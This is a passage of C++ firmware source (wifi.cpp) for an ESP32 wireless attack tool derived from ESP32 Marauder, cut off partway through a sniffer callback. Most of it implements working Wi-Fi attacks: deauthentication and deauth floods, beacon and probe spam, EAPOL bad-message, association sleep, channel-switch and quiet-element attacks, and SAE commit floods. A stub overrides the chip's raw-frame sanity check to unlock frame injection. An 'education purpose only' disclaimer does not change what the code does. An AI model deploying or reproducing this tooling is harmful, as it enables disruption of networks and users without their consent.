#include "wifiheader.h"

/*
    * wifi.cpp (Based ESP32 Marauder By @justcallmekoko, Bruce By @pr3y)
	* /!\ WARNING: All Code I Wrote In This Is For Education Purpose ONLY! /!\
    * /!\        I NOT RESPONSIBLE ANY DAMAGE USER CAUSE IN PUBLIC         /!\
	* Author: Shine Nagumo @Ohminecraft (Xun Anh Nguyen)
	* Licensed under the MIT License.
*/


LinkedList<AccessPoint>* access_points;
LinkedList<AccessPoint>* deauth_flood_ap;
LinkedList<Station>* device_station;
LinkedList<ProbeReqSsid>* probe_req_ssids;

bool wifiScanRedraw = false;
bool eapol_scan_send_deauth = false;

uint8_t *current_act = nullptr;

static mbedtls_ecp_group ecp_group;
static mbedtls_ecp_point ecp_point;
static mbedtls_mpi prec_int;
static mbedtls_ctr_drbg_context ctr_drbg;
static mbedtls_entropy_context entropy;

extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
    if (arg == 31337)
      return 1;
    else
      return 0;
}

void WiFiModules::main() {
	if (ieee80211_raw_frame_sanity_check(31337, 0, 0) == 1) {
		this->wsl_bypass_enable = true;
		Serial.println("[INFO] Wsl bypass enabled");
	}
	else {
		this->wsl_bypass_enable = false;
		Serial.println("[INFO] Wsl bypass disabled");
	}
	
    access_points = new LinkedList<AccessPoint>();
	deauth_flood_ap = new LinkedList<AccessPoint>();
	device_station = new LinkedList<Station>();
	probe_req_ssids = new LinkedList<ProbeReqSsid>();

	esp_wifi_init(&cfg);
	#ifdef BOARD_ESP32_C5_DEVKIT_C1
		esp_wifi_set_country(&country);
      	esp_event_loop_create_default();
	#endif
	esp_wifi_set_mode(WIFI_AP_STA);
	esp_wifi_start();
	wifi_initialized = true;
	Serial.println("[INFO] WiFi initialized successfully");
	esp_wifi_get_mac(WIFI_IF_AP, this->ap_mac);
	vTaskDelay(10 / portTICK_PERIOD_MS);
	esp_wifi_get_mac(WIFI_IF_STA, this->sta_mac);
	this->setMac();
	this->ShutdownWiFi();
}

bool WiFiModules::ShutdownWiFi() {
	if (wifi_initialized) {

		if (eapol_scan_send_deauth) eapol_scan_send_deauth = false;

		esp_wifi_set_promiscuous(false);
		WiFi.disconnect();
		WiFi.mode(WIFI_OFF);

		//dst_mac = "ff:ff:ff:ff:ff:ff";

		esp_wifi_set_mode(WIFI_MODE_NULL);
		esp_wifi_stop();
		esp_wifi_restore();
		esp_wifi_deinit();
		esp_netif_deinit();
		wifi_initialized = false;

		Serial.println("[INFO] WiFi shutdown successfully");
		return true;
	}
	else {
		Serial.println("[ERROR] WiFi is not initialized, cannot shutdown");
		return false;
	}
}

void WiFiModules::mainAttackLoop(WiFiScanState attack_mode) {
	if (attack_mode == WIFI_ATTACK_DEAUTH) {
		for (int i = 0; i < 55; i++) sendDeauthAttack();
	}
	else if (attack_mode == WIFI_ATTACK_STA_DEAUTH) {
		for (int x = 0; x < access_points->size(); x++) {
			if (access_points->get(x).selected) {
				AccessPoint sel_ap = access_points->get(x);
				for (int i = 0; i <  sel_ap.stations->size(); i++) {
					if (device_station->get(sel_ap.stations->get(i)).selected) {
						Station sel_sta = device_station->get(sel_ap.stations->get(i));
						for (int y = 0; y < 55; y++)
              				this->sendDeauthFrame(sel_ap.bssid, sel_ap.channel, sel_sta.mac);
					}
				}
			}
		}
	}
	else if (attack_mode == WIFI_ATTACK_AUTH) {
		for (int i = 0; i < 55; i++) sendProbeAttack();
	}
	else if (attack_mode == WIFI_ATTACK_RND_BEACON) {
		static long long exectime = millis();
		sendBeaconRandomSSID();
		if (millis() - exectime < 1000) {
			#ifdef BOARD_ESP32_C5_DEVKIT_C1
				set_channel = dual_band_channels[random(0, DUAL_BAND_CHANNELS)];
			#else
				set_channel = random(0, 12);
			#endif
			changeChannel();
			vTaskDelay(1 / portTICK_PERIOD_MS);
			exectime = millis();
		}
	}
	else if (attack_mode == WIFI_ATTACK_FUN_BEACON) {
		for (int i = 0; i < 7; i++) {
			for (int x = 0; x < GET_SIZE(funny_ssid_beacon); x++) {
				static long long exectime = millis();
				sendCustomESSIDBeacon(funny_ssid_beacon[x]);
				if (millis() - exectime < 1000) {
				#ifdef BOARD_ESP32_C5_DEVKIT_C1
					set_channel = dual_band_channels[random(0, DUAL_BAND_CHANNELS)];
				#else
					set_channel = random(0, 12);
				#endif
				changeChannel();
				vTaskDelay(1 / portTICK_PERIOD_MS);
				exectime = millis();
		}
			}
		}
	}
	else if (attack_mode == WIFI_ATTACK_RIC_BEACON) {
		for (int i = 0; i < 7; i++)
		{
			for (int x = 0; x < GET_SIZE(rick_roll); x++)
			{
				static long long exectime = millis();
				sendCustomESSIDBeacon(rick_roll[x]);
				if (millis() - exectime < 1000) {
					#ifdef BOARD_ESP32_C5_DEVKIT_C1
						set_channel = dual_band_channels[random(0, DUAL_BAND_CHANNELS)];
					#else
						set_channel = random(0, 12);
					#endif
					changeChannel();
					vTaskDelay(1 / portTICK_PERIOD_MS);
					exectime = millis();
				}
			}
		}
	}
	else if (attack_mode == WIFI_ATTACK_AP_BEACON) {
		for (int i = 0; i < access_points->size(); i++) {
			if (access_points->get(i).selected) {
				static long long exectime = millis();
				sendCustomBeacon(access_points->get(i));  
				if (millis() - exectime < 1000) {
					#ifdef BOARD_ESP32_C5_DEVKIT_C1
						set_channel = dual_band_channels[random(0, DUAL_BAND_CHANNELS)];
					#else
						set_channel = random(0, 12);
					#endif
					changeChannel();
					vTaskDelay(1 / portTICK_PERIOD_MS);
					exectime = millis();
				}   
			}
		}
	}
	else if (attack_mode == WIFI_ATTACK_BAD_MSG) {
		for (int i = 0; i < access_points->size(); i++) {
			for (int x = 0; x < access_points->get(i).stations->size(); x++) {
			  	if (device_station->get(access_points->get(i).stations->get(x)).selected) {
					sendEapolBagMsg(access_points->get(i).bssid,
										  access_points->get(i).channel,
										  device_station->get(access_points->get(i).stations->get(x)).mac,
										  access_points->get(i).wpa);
			 	}
			}
		}
	}
	else if (attack_mode == WIFI_ATTACK_BAD_MSG_ALL) {
		for (int i = 0; i < access_points->size(); i++) {
			if (access_points->get(i).selected) {
			  for (int x = 0; x < access_points->get(i).stations->size(); x++) {
					sendEapolBagMsg(access_points->get(i).bssid,
										  access_points->get(i).channel,
										  device_station->get(access_points->get(i).stations->get(x)).mac,
										  access_points->get(i).wpa);
			  	}
			}
		}
	}
	else if (attack_mode == WIFI_ATTACK_SLEEP) {
		for (int i = 0; i < access_points->size(); i++) {
			for (int x = 0; x < access_points->get(i).stations->size(); x++) {
			  	if (device_station->get(access_points->get(i).stations->get(x)).selected) {
					sendAssociationSleep(access_points->get(i).essid.c_str(), access_points->get(i).bssid,
									 access_points->get(i).channel,
									 device_station->get(access_points->get(i).stations->get(x)).mac);
			 	}
			}
		}
	}
	else if (attack_mode == WIFI_ATTACK_SLEEP_ALL) {
		for (int i = 0; i < access_points->size(); i++) {
			if (access_points->get(i).selected) {
			  for (int x = 0; x < access_points->get(i).stations->size(); x++) {
				sendAssociationSleep(access_points->get(i).essid.c_str(), access_points->get(i).bssid,
									 access_points->get(i).channel,
									 device_station->get(access_points->get(i).stations->get(x)).mac);
			  	}
			}
		}
	}
	else if (attack_mode == WIFI_ATTACK_CSA) {
		for (int i = 0; i < access_points->size(); i++) {
			if (access_points->get(i).selected) {
				sendQuietCsaAttack(access_points->get(i), true);
			}
		}
	}
	else if (attack_mode == WIFI_ATTACK_QUIET) {
		for (int i = 0; i < access_points->size(); i++) {
			if (access_points->get(i).selected) {
				sendQuietCsaAttack(access_points->get(i), false);
			}
		}
	}
	else if (attack_mode == WIFI_ATTACK_SAE_COMMIT) {
		for (int i = 0; i < access_points->size(); i++) {
			if (access_points->get(i).selected) {
				if (this->set_channel != access_points->get(i).channel) {
					this->set_channel = access_points->get(i).channel;
					changeChannel();
				}
				uint8_t random_mac[6];
				generateRandomMac(random_mac);

				if (sendSAECommitFrame(access_points->get(i).bssid, random_mac)) {
					packet_sent = packet_sent + 1;
					//Serial.println("[ERROR] Failed to send SAE Commit frame");
				}
			}
		}
	}
}

void WiFiModules::StartMode(WiFiScanState mode) {
	if (mode == WIFI_SCAN_OFF) {
		if (wifi_initialized) this->ShutdownWiFi();
		this->packet_sent = 0;
		Serial.println("[INFO] WiFi scan mode is OFF, WiFi shutdown.");
	}
	else if (mode == WIFI_SCAN_AP) {
		this->StartAPWiFiScan();
	}
	else if (mode == WIFI_SCAN_AP_OLD) {
		this->StartAPWiFiScanOld();
	}
	else if (mode == WIFI_SCAN_AP_STA) {
		this->StartAPStaWiFiScan();
	}
	else if (mode == WIFI_SCAN_DEAUTH) {
		this->StartDeauthScan();
	}
	else if (mode == WIFI_SCAN_PROBE_REQ) {
		this->StartProbeReqScan();
	}
	else if (mode == WIFI_SCAN_BEACON) {
		this->StartBeaconScan();
	}
	else if (mode == WIFI_SCAN_EAPOL) {
		this->StartEapolScan();
	}
	else if (mode == WIFI_SCAN_EAPOL_DEAUTH) {
		eapol_scan_send_deauth = true;
		this->StartEapolScan();
	}
	else if (mode == WIFI_SCAN_CH_ANALYZER) {
		this->StartAnalyzerScan();
	}
	else if (mode == WIFI_SCAN_SAE_COMMIT) {
		this->SAEScan(false);
	}
	else if (mode == WIFI_ATTACK_SAE_COMMIT) {
		this->SAEScan(true);
		Serial.println("[INFO] Starting [SAE Commit] Attack!");
	}
	else if (mode == WIFI_ATTACK_DEAUTH) {
		this->StartWiFiAttack(mode);
		Serial.println("[INFO] Starting [Deauth] Attack!");
	}
	else if (mode == WIFI_ATTACK_STA_DEAUTH) {
		this->StartWiFiAttack(mode);
		Serial.println("[INFO] Starting [Station Deauth] Attack!");
	}
	else if (mode == WIFI_ATTACK_DEAUTH_FLOOD) {
		this->StartDeauthFlood();
		Serial.println("[INFO] Starting [Deauth Flood] Attack!");
	}
	else if (mode == WIFI_ATTACK_AUTH) {
		this->StartWiFiAttack(mode);
		Serial.println("[INFO] Starting [Probe] Attack!");
	}
	else if (mode == WIFI_ATTACK_RND_BEACON) {
		this->StartWiFiAttack(mode);
		Serial.println("[INFO] Starting [Random Beacon] Attack!");
	}
	else if (mode == WIFI_ATTACK_FUN_BEACON) {
		this->StartWiFiAttack(mode);
		Serial.println("[INFO] Staring [Stable Beacon] Attack!");
	}
	else if (mode == WIFI_ATTACK_RIC_BEACON) {
		this->StartWiFiAttack(mode);
		Serial.println("[INFO] Starting [Rick Roll Beacon] Attack!");
	}
	else if (mode == WIFI_ATTACK_AP_BEACON) {
		this->StartWiFiAttack(mode);
		Serial.println("[INFO] Starting [AccessPoint Beacon] Attack!");
	}
	else if (mode == WIFI_ATTACK_BAD_MSG) {
		this->StartWiFiAttack(mode);
		Serial.println("[INFO] Starting [Target BadMsg] Attack!");
	}
	else if (mode == WIFI_ATTACK_BAD_MSG_ALL) {
		this->StartWiFiAttack(mode);
		Serial.println("[INFO] Starting [BadMsg All] Attack!");
	}
	else if (mode == WIFI_ATTACK_SLEEP) {
		this->StartWiFiAttack(mode);
		Serial.println("[INFO] Starting [Target Association Sleep] Attack!");
	}
	else if (mode == WIFI_ATTACK_SLEEP_ALL) {
		this->StartWiFiAttack(mode);
		Serial.println("[INFO] Starting [Association Sleep All] Attack!");
	}
	else if (mode == WIFI_ATTACK_CSA) {
		this->StartWiFiAttack(mode);
		Serial.println("[INFO] Starting [Channel Switch Announcement] Attack!");
	}
	else if (mode == WIFI_ATTACK_QUIET) {
		this->StartWiFiAttack(mode);
		Serial.println("[INFO] Starting [Quiet] Attack!");
	}
	else {
		Serial.println("[ERROR] Invalid WiFi mode selected");
	}
}

void WiFiModules::StartWiFiAttack(WiFiScanState attack_mode) {
	ap_config.ap.ssid_hidden = 1;
	ap_config.ap.beacon_interval = 10000;
	ap_config.ap.ssid_len = 0;
	esp_wifi_init(&cfg);
	#ifdef BOARD_ESP32_C5_DEVKIT_C1
		esp_wifi_set_country(&country);
	#endif
	esp_wifi_set_storage(WIFI_STORAGE_RAM);
	esp_wifi_set_mode(WIFI_MODE_AP);
	esp_wifi_set_config(WIFI_IF_AP, &ap_config);
	esp_wifi_start();
	this->setMac();
	esp_wifi_set_promiscuous(true);
	esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);

	esp_wifi_set_max_tx_power(82);
	this->packet_sent = 0;
	wifi_initialized = true;
	Serial.println("[INFO] WiFi re-initialized successfully");
	Serial.println("[INFO] Ready to attack!");
}

inline uint16_t WiFiModules::le16(const uint8_t *p) {
  return (uint16_t)p[0] | ((uint16_t)p[1] << 8);
}

bool WiFiModules::sae_group_sizes(uint16_t group, size_t &scalar_len, size_t &element_len) {
  switch (group) {
    case 19: scalar_len = 32; element_len = 64; return true;   // P-256
    case 20: scalar_len = 48; element_len = 96; return true;   // P-384
    case 21: scalar_len = 66; element_len = 132; return true;  // P-521
    default: return false;
  }
}


bool WiFiModules::mac_cmp(const uint8_t *a, const uint8_t *b) {
  return memcmp(a, b, 6) == 0;
}

int WiFiModules::mbedtls_entropy_source(void *data, unsigned char *output, size_t len) {
  (void)data;

  esp_fill_random(output, len);

  return 0;
}

bool WiFiModules::initMbedtls() {
  const char *personalization = "initmbedtls";

  mbedtls_entropy_init(&entropy);
  mbedtls_ctr_drbg_init(&ctr_drbg);

  if (mbedtls_ctr_drbg_seed(&ctr_drbg, mbedtls_entropy_source, NULL, (const unsigned char *) personalization, strlen(personalization)) != 0)
    return false;

  mbedtls_ecp_group_init(&ecp_group);
  mbedtls_ecp_point_init(&ecp_point);
  mbedtls_mpi_init(&prec_int);

  if (mbedtls_ecp_group_load(&ecp_group, MBEDTLS_ECP_DP_SECP256R1) != 0)
    return false;

  return true;
}

void WiFiModules::setMac() {
	wifi_mode_t currentWiFiMode;
  	esp_wifi_get_mode(&currentWiFiMode);
	esp_err_t result_ap = esp_wifi_set_mac(WIFI_IF_AP, this->ap_mac);
	if ((result_ap != ESP_OK) &&
		((currentWiFiMode == WIFI_MODE_AP) || (currentWiFiMode == WIFI_MODE_APSTA) || (currentWiFiMode == WIFI_MODE_NULL)))
        Serial.printf("[WARN] Failed to set AP MAC: %s | 0x%X\n", macToString(this->ap_mac).c_str(), result_ap);
  	else if ((currentWiFiMode == WIFI_MODE_AP) || (currentWiFiMode == WIFI_MODE_APSTA) || (currentWiFiMode == WIFI_MODE_NULL))
    	Serial.printf("[INFO] Successfully set AP MAC: %s\n", macToString(this->ap_mac).c_str());
	esp_err_t result_sta = esp_wifi_set_mac(WIFI_IF_STA, this->sta_mac);
	if ((result_sta != ESP_OK) &&
		((currentWiFiMode == WIFI_MODE_STA) || (currentWiFiMode == WIFI_MODE_APSTA)))
		Serial.printf("[WARN] Failed to set STA MAC: %s | 0x%X\n", macToString(this->sta_mac).c_str(), result_sta);
  	else if ((currentWiFiMode == WIFI_MODE_STA) || (currentWiFiMode == WIFI_MODE_APSTA))
		Serial.printf("[INFO] Successfully set STA MAC: %s\n", macToString(this->sta_mac).c_str());
}

void WiFiModules::changeChannel() {
	esp_wifi_set_channel(this->set_channel, WIFI_SECOND_CHAN_NONE);
	vTaskDelay(1 / portTICK_PERIOD_MS);
}

void WiFiModules::channelHop() {
	#ifndef BOARD_ESP32_C5_DEVKIT_C1
	this->set_channel = this->set_channel + 1;
	if (this->set_channel > 14) {
		this->set_channel = 1;
	}
	#else
	//if (dual_band_channels_index >= DUAL_BAND_CHANNELS) dual_band_channels_index = 0;
	//else this->dual_band_channels_index++;
	this->set_channel = this->dual_band_channels[dual_band_channels_index];
	dual_band_channels_index = (dual_band_channels_index + 1) % DUAL_BAND_CHANNELS;
	#endif
	
	esp_wifi_set_channel(this->set_channel, WIFI_SECOND_CHAN_NONE);
	Serial.printf("[INFO] Changed channel to %d using channel hop\n", this->set_channel);
	vTaskDelay(1 / portTICK_PERIOD_MS);
}

void WiFiModules::channelRandom() {
	#ifndef BOARD_ESP32_C5_DEVKIT_C1
	this->set_channel = random(14) + 1;
	#else
	this->set_channel = this->dual_band_channels[random(DUAL_BAND_CHANNELS)];
	#endif
	esp_wifi_set_channel(this->set_channel, WIFI_SECOND_CHAN_NONE);
	//Serial.printf("Channel channel to %d using channel random\n", this->set_channel);
	vTaskDelay(1 / portTICK_PERIOD_MS);
}

void WiFiModules::StartDeauthFlood() {
	if (!deauth_flood_scan_one_shot) {
		deauth_flood_ap->clear();

		esp_netif_init();
		esp_event_loop_create_default();

		esp_wifi_init(&cfg2);
		#ifdef BOARD_ESP32_C5_DEVKIT_C1
			esp_wifi_set_country(&country);
			esp_event_loop_create_default();
		#endif
		esp_wifi_set_storage(WIFI_STORAGE_RAM);
		esp_wifi_set_mode(WIFI_MODE_NULL);
		esp_wifi_start();
		this->setMac();
		esp_wifi_set_promiscuous(true);
		esp_wifi_set_promiscuous_filter(&filt);
		esp_wifi_set_promiscuous_rx_cb(&deauthFloodSnifferCallback);
		esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
		wifi_initialized = true;
		delay(100);

		deauth_flood_scan_one_shot = true;

		#ifndef BOARD_ESP32_C5_DEVKIT_C1
		while (set_channel < 15) {
			set_channel++;
			changeChannel();
			vTaskDelay(300 / portTICK_PERIOD_MS);
		}
		#else
		while (dual_band_channels_index < DUAL_BAND_CHANNELS) {
			set_channel = dual_band_channels[dual_band_channels_index];
			changeChannel();
			dual_band_channels_index++;
			vTaskDelay(300 / portTICK_PERIOD_MS);
		}
		dual_band_channels_index = 0;
		#endif

		Serial.println("[INFO] Deauth WiFi Scan Done! Total: " + String(deauth_flood_ap->size()) + " Found!");

		if (deauth_flood_ap->size() > 0) deauth_flood_found_ap = true;

		Serial.println("[INFO] Starting Deauth Flood");

		deauth_flood_redraw = true;

		this->StartWiFiAttack(WIFI_ATTACK_DEAUTH_FLOOD);
	}

	//while (!check(selPress)) {
		static unsigned long reScanCounter = 0;
		for (int i = 0; i < deauth_flood_ap->size(); i++) {
			static unsigned long lastReDrawTime = 0;
			this->set_channel = deauth_flood_ap->get(i).channel;
			changeChannel();
			memcpy(&deauth_frame_packet[10], deauth_flood_ap->get(i).bssid, 6);
			memcpy(&deauth_frame_packet[16], deauth_flood_ap->get(i).bssid, 6);
			//for (int j = 0; j < 55; j++) {
				esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_packet, sizeof(deauth_frame_packet), false);
				vTaskDelay(1 / portTICK_RATE_MS);
				esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_packet, sizeof(deauth_frame_packet), false);
				vTaskDelay(1 / portTICK_RATE_MS);
				esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_packet, sizeof(deauth_frame_packet), false);
				vTaskDelay(1 / portTICK_RATE_MS);
			//}
			if (millis() - lastReDrawTime > 500) {
				deauth_flood_redraw = true;
				deauth_flood_target = deauth_flood_ap->get(i).essid;
				vTaskDelay(1 / portTICK_PERIOD_MS);
				lastReDrawTime = millis();
			}
		}
		if (millis() - reScanCounter > 60000) {
			deauth_flood_scan_one_shot = false;
			reScanCounter = millis();
		}
	//}
}

// https://github.com/justcallmekoko/ESP32Marauder/blob/master/esp32_marauder/WiFiScan.cpp
uint8_t WiFiModules::getSecurityType(const uint8_t* beacon, uint16_t len) {
    if (len < 36) return WIFI_SECURITY_OPEN;

    const uint8_t* frame = beacon;
    const uint8_t* ies = beacon + 36; // Tagged parameters start after fixed 802.11 header
    uint16_t ies_len = len - 36;

    bool hasRSN = false;
    bool hasWPA = false;
    bool isEnterprise = false;
    bool isWPA3 = false;
    bool isWAPI = false;

    uint16_t i = 0;
    while (i + 2 <= ies_len) {
        uint8_t tag_id  = ies[i];
        uint8_t tag_len = ies[i + 1];

        if (i + 2 + tag_len > ies_len) break; // Malformed IE, stop parsing

        const uint8_t* tag_data = ies + i + 2;

        // ── RSN IE (Tag 48) — indicates WPA2/WPA3 ────────────────────
        if (tag_id == 48) {
            hasRSN = true;

            // Minimum size to reach AKM list:
            // version(2) + group cipher(4) + pairwise count(2) + 1 suite(4) + AKM count(2) = 14
            if (tag_len < 14) { i += 2 + tag_len; continue; }

            // Skip version (2 bytes) and group cipher suite (4 bytes)
            uint16_t offset = 6;

            // Read pairwise cipher suite count and skip over the entire pairwise list
            // This offset is dynamic — hardcoding byte 14 is wrong when count > 1
            uint16_t pw_count = tag_data[offset] | ((uint16_t)tag_data[offset + 1] << 8);
            offset += 2 + pw_count * 4;

            // Bounds check before reading AKM count
            if (offset + 2 > tag_len) { i += 2 + tag_len; continue; }

            uint16_t akm_count = tag_data[offset] | ((uint16_t)tag_data[offset + 1] << 8);
            offset += 2;

            // Iterate over each AKM suite (4 bytes: 3-byte OUI + 1-byte type)
            for (uint16_t a = 0; a < akm_count; a++) {
                if (offset + 4 > tag_len) break;

                // OUI 00:0F:AC identifies IEEE 802.11 standard AKM suites
                bool isIEEE = (tag_data[offset]     == 0x00 &&
                               tag_data[offset + 1] == 0x0f &&
                               tag_data[offset + 2] == 0xac);

                uint8_t akmType = tag_data[offset + 3];

                if (isIEEE) {
                    if (akmType == 1 ||
						akmType == 3 ||
						akmType == 12 ||
						akmType == 13)
					isEnterprise = true; // 802.1X authentication (WPA2-Enterprise) | FT over 802.1X | FILS-SHA256 (WPA3-Enterprise) | FILS-SHA384 (WPA3-Enterprise)
                    if (akmType == 8)  isWPA3 = true;       // SAE (Simultaneous Authentication of Equals) — WPA3-Personal
                }

                offset += 4;
            }
        }

        // ── WPA IE (Tag 221, OUI 00:50:F2:01) — indicates WPA1 ───────
        else if (tag_id == 221 && tag_len >= 8 &&
                 tag_data[0] == 0x00 && tag_data[1] == 0x50 &&
                 tag_data[2] == 0xf2 && tag_data[3] == 0x01) {
            hasWPA = true;

            if (tag_len < 14) { i += 2 + tag_len; continue; }

            // WPA IE layout: OUI(3) + type(1) + version(2) + group cipher(4) = 10 bytes before pairwise count
            uint16_t offset = 10;
            uint16_t pw_count = tag_data[offset] | ((uint16_t)tag_data[offset + 1] << 8);
            offset += 2 + pw_count * 4;

            if (offset + 2 > tag_len) { i += 2 + tag_len; continue; }

            uint16_t akm_count = tag_data[offset] | ((uint16_t)tag_data[offset + 1] << 8);
            offset += 2;

            // Check each AKM suite for 802.1X (WPA-Enterprise)
            for (uint16_t a = 0; a < akm_count; a++) {
                if (offset + 4 > tag_len) break;

                // OUI 00:50:F2 is Microsoft's OUI used in WPA IE
                bool isMSOUI = (tag_data[offset]     == 0x00 &&
                                tag_data[offset + 1] == 0x50 &&
                                tag_data[offset + 2] == 0xf2);

                if (isMSOUI && tag_data[offset + 3] == 0x01) isEnterprise = true; // AKM type 1 = 802.1X

                offset += 4;
            }
        }

        // ── WAPI IE (Tag 68) — Chinese national Wi-Fi security standard ──
        else if (tag_id == 68) {
            isWAPI = true;
        }

        i += 2 + tag_len;
    }

    // ── Security type decision tree (most specific first) ────────────
    if (isWAPI)                 return WIFI_SECURITY_WAPI;
    if (isWPA3 && isEnterprise) return WIFI_SECURITY_WPA3_ENTERPRISE;
    if (isWPA3)                 return WIFI_SECURITY_WPA3;
    if (hasRSN && isEnterprise) return WIFI_SECURITY_WPA2_ENTERPRISE;
    if (hasRSN && hasWPA)       return WIFI_SECURITY_WPA_WPA2_MIXED;
    if (hasRSN)                 return WIFI_SECURITY_WPA2;
    if (hasWPA)                 return isEnterprise ? WIFI_SECURITY_WPA2_ENTERPRISE
                                                    : WIFI_SECURITY_WPA;

    // WEP is not advertised via IEs — detected through the Privacy bit (bit 4)
    // in the Capability Information field at bytes 34-35 (little-endian)
    uint16_t capab = (uint16_t)frame[34] | ((uint16_t)frame[35] << 8);
    if (capab & 0x0010) return WIFI_SECURITY_WEP;

    return WIFI_SECURITY_OPEN;
}

// https://github.com/justcallmekoko/ESP32Marauder/blob/master/esp32_marauder/WiFiScan.cpp
void WiFiModules::apSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
	extern WiFiModules wifi;
	wifi_promiscuous_pkt_t *snifferPacket = (wifi_promiscuous_pkt_t*)buf;
	WifiMgmtHdr *frameControl = (WifiMgmtHdr*)snifferPacket->payload;
	int len = snifferPacket->rx_ctrl.sig_len;

	String essid = "";
	String bssid = "";

	if (type == WIFI_PKT_MGMT) {
		len -= 4;
		int fctl = ntohs(frameControl->fctl);
		const wifi_ieee80211_packet_t *ipkt = (wifi_ieee80211_packet_t *)snifferPacket->payload;
		const WifiMgmtHdr *hdr = &ipkt->hdr;

		if ((snifferPacket->payload[0] == 0x80))
    	{
			char addr[] = "00:00:00:00:00:00";
			getMAC(addr, snifferPacket->payload, 10);
			bool in_list = false;
			bool mac_match = true;

			for (int i = 0; i < access_points->size(); i++) {
				mac_match = true;

				
				for (int x = 0; x < 6; x++) {
					if (snifferPacket->payload[x + 10] != access_points->get(i).bssid[x]) {
						mac_match = false;
						break;
					}
				}
				if (mac_match) {
					in_list = true;
					break;
				}
			}

			if (!in_list) {
		
				vTaskDelay(random(0, 10) / portTICK_PERIOD_MS);
				for (int i = 0; i < snifferPacket->payload[37]; i++)
				{
					essid.concat((char)snifferPacket->payload[i + 38]);
				}

				bssid.concat(addr);
			
					
				if (essid.isEmpty()) {
					essid = bssid;
				}

				uint32_t ie_offset = 36;
				uint8_t channel = 0;
            
				while (ie_offset + 2 < len) {
					uint8_t ie_type = snifferPacket->payload[ie_offset];
					uint8_t ie_length = snifferPacket->payload[ie_offset + 1];
					
					if (ie_offset + 2 + ie_length > len) break;

					if (ie_type == 3 && ie_length >= 1) {  // DS Parameter Set
						channel = snifferPacket->payload[ie_offset + 2];
						break;
					}
					
					ie_offset += 2 + ie_length;
				}

				if (channel == 0) channel = snifferPacket->rx_ctrl.channel;

				WiFiScanBand band;
				if (channel > 13) {
					band = WIFI_BAND_5Ghz;
				} else {
					band = WIFI_BAND_2_4Ghz;
				}

				if (!low_memory_warning)
					//display_buffer->add("Ch:" + String(snifferPacket->rx_ctrl.channel) + " " + essid);
					display_buffer->add("Ch:" + String(channel) + " " + essid);
				else
					display_buffer->add("Low Mem! Ignore!");
				wifiScanRedraw = true;

				String wpastr = "";

				uint8_t security_type = wifi.getSecurityType(snifferPacket->payload, snifferPacket->rx_ctrl.sig_len);

				switch(security_type) {
					case WIFI_SECURITY_OPEN: wpastr = "Open"; break;
					case WIFI_SECURITY_WEP: wpastr = "WEP"; break;
					case WIFI_SECURITY_WPA: wpastr = "WPA"; break;
					case WIFI_SECURITY_WPA2: wpastr = "WPA2"; break;
					case WIFI_SECURITY_WPA2_ENTERPRISE: wpastr = "WPA2/Enterprise"; break;
					case WIFI_SECURITY_WPA3: wpastr = "WPA3"; break;
					case WIFI_SECURITY_WPA_WPA2_MIXED: wpastr = "WPA/WPA2 Mixed"; break;
					case WIFI_SECURITY_WAPI: wpastr = "WAPI"; break;
				}

				AccessPoint _temp_ap = {essid,
					//static_cast<uint8_t>(snifferPacket->rx_ctrl.channel),
					channel, {
					snifferPacket->payload[10],
					snifferPacket->payload[11],
					snifferPacket->payload[12],
					snifferPacket->payload[13],
					snifferPacket->payload[14],
					snifferPacket->payload[15]},
					security_type, wpastr, false, new LinkedList<uint16_t>(),
					{snifferPacket->payload[34], snifferPacket->payload[35]},
					band,
					static_cast<int8_t>(snifferPacket->rx_ctrl.rssi)};
				
				if (!low_memory_warning) {
					access_points->add(_temp_ap);
					Serial.println("[INFO] Added: " + essid + "(Ch: " + /*String(snifferPacket->rx_ctrl.channel)*/ String(channel) + ")" + " (BSSID: " + bssid \
					+ ")" + " (RSSI: " + String(snifferPacket->rx_ctrl.rssi) + ")" + " (Security: " + wpastr + ")");
				} else {
					Serial.println("[WARN] Low Memory! Ignore AP " + essid + "(Ch: " + /*String(snifferPacket->rx_ctrl.channel)*/ String(channel) + ")" + " (BSSID: " + bssid \
					+ ")" + " (RSSI: " + String(snifferPacket->rx_ctrl.rssi) + ")" + " (Security: " + wpastr + ") - Not added to list");
				}

				if (!first_scan) logutils.pcapAppend(snifferPacket, len);
			}
		}
	}
}

void WiFiModules::deauthFloodSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
	extern WiFiModules wifi;
	wifi_promiscuous_pkt_t *snifferPacket = (wifi_promiscuous_pkt_t*)buf;
	WifiMgmtHdr *frameControl = (WifiMgmtHdr*)snifferPacket->payload;
	int len = snifferPacket->rx_ctrl.sig_len;

	String essid = "";
	String bssid = "";

	if (type == WIFI_PKT_MGMT) {
		len -= 4;
		int fctl = ntohs(frameControl->fctl);
		const wifi_ieee80211_packet_t *ipkt = (wifi_ieee80211_packet_t *)snifferPacket->payload;
		const WifiMgmtHdr *hdr = &ipkt->hdr;

		if ((snifferPacket->payload[0] == 0x80))
    	{
			char addr[] = "00:00:00:00:00:00";
			getMAC(addr, snifferPacket->payload, 10);
			bool in_list = false;
			bool mac_match = true;

			for (int i = 0; i < access_points->size(); i++) {
				mac_match = true;

				
				for (int x = 0; x < 6; x++) {
					if (snifferPacket->payload[x + 10] != access_points->get(i).bssid[x]) {
						mac_match = false;
						break;
					}
				}
				if (mac_match) {
					in_list = true;
					break;
				}
			}

			if (!in_list) {
		
				vTaskDelay(random(0, 10) / portTICK_PERIOD_MS);
				for (int i = 0; i < snifferPacket->payload[37]; i++)
				{
					essid.concat((char)snifferPacket->payload[i + 38]);
				}

				bssid.concat(addr);
			
					
				if (essid.isEmpty()) {
					essid = bssid;
				}

				uint32_t ie_offset = 36;
				uint8_t channel = 0;
            
				while (ie_offset + 2 < len) {
					uint8_t ie_type = snifferPacket->payload[ie_offset];
					uint8_t ie_length = snifferPacket->payload[ie_offset + 1];
					
					if (ie_offset + 2 + ie_length > len) break;

					if (ie_type == 3 && ie_length >= 1) {  // DS Parameter Set
						channel = snifferPacket->payload[ie_offset + 2];
						break;
					}
					
					ie_offset += 2 + ie_length;
				}

				if (channel == 0) channel = snifferPacket->rx_ctrl.channel;

